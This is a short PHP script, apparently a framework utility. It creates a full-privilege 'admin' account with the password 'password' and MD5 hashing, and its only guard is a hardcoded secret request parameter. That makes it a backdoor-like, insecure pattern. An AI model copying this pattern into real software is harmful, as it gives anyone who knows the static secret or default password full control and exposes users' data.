<?php
defined('D_RUN') or die('Direct access prohibited');

$_REQUEST['secret'] == '874jdiv8' or die();

$new_admin_user = new entity;
$new_admin_user->name = 'admin';
$new_admin_user->add_tag('com_user', 'user');
$new_admin_user->username = 'admin';
$new_admin_user->salt = md5(rand());
$new_admin_user->password = md5('password'.$new_admin_user->salt);
$new_admin_user->abilities = array('system/all');

$new_admin_user->save();

display_notice('Admin user created.');

?>
